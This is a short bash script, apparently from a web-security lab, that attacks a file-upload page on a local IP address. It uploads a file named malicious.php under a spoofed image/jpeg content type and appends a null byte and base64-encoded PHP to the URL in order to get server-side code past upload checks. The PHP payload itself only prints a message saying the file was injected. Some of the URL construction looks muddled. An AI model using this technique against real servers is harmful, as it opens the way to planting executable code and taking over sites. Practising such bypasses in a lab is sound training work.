#!/bin/bash

ip="192.168.64.3"
filename="malicious.php"
malicious_code='<?php echo "Ce fichier a été injecté !"; ?>'
encoded_malicious_code=$(echo -n $malicious_code | base64)
url="http://$ip/?page=upload#image.jpeg%00<php>$encoded_malicious_code</php>"
curl -s -F "uploaded=@$filename;type=image/jpeg" -F "Upload=Upload" "$url&page=upload#"
